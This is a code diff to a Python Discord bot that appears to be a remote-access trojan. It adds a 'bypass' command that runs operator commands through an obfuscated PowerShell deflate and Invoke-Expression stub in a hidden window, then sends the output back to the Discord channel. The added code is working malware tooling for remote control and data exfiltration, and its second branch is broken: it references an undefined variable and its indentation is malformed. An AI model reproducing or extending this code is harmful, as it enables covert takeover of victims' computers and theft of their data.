@@ -1,6 +1,7 @@
 import discord
 from discord.ext import commands
 import os
+import base64
 import subprocess as sp
 import requests
 import random
@@ -328,6 +329,48 @@ async def persistent(context):
         my_embed = discord.Embed(title=f"Error while making Agent#{ID} persistent:\n{e}", color=0xFF0000)
         await context.message.channel.send(embed=my_embed)
 
+@client.command(name='bypass')
+async def bypass(context):
+    command = context.message.content.replace("!bypass ", "")
+    word_list = command.split()
+    if word_list[0] == str(ID):
+        word_list.pop(0)
+        plain_command = " ".join(word_list)
+        code = bytearray(plain_command, 'utf-16-le');code = base64.b64encode(code).decode()        
+
+        final_command = "Set-Variable -Name 'code' -Value "+f'"{code}";'+r"(nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9lH53f22mSdv') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION"
+
+        result = sp.Popen(final_command.split(), stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
+        out, err = result.communicate()
+        result.wait()
+        
+        if len(out) > 4000:
+            path = os.environ["temp"] +"\\response.txt"     
+            with open(path, 'w') as file:
+                file.write(out)
+            await context.message.channel.send(f"**Message was too large, sending a file with the response instead**")
+            await context.message.channel.send(file=discord.File(path))
+            os.remove(path)
+        else:
+            await context.message.channel.send(f"```\n{out}\n```")
+    else:
+        plain_command = " ".join(word_list)
+	  code = base64.b64encode(plain_command.encode()).decode()        
+
+        result = sp.Popen(final_command.split(), stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
+        out, err = result.communicate()
+        result.wait()
+        
+        if len(out) > 4000:
+            path = os.environ["temp"] +"\\response.txt"      
+            with open(path, 'w') as file:
+                file.write(out)
+            await context.message.channel.send(f"**Message was too large, sending a file with the response instead**")
+            await context.message.channel.send(file=discord.File(path))
+            os.remove(path)
+        else:
+            await context.message.channel.send(f"```\n{out}\n```")        
+        
 @client.command(name='cmd')
 async def cmd(context):
     command = context.message.content.replace("!cmd ", "")
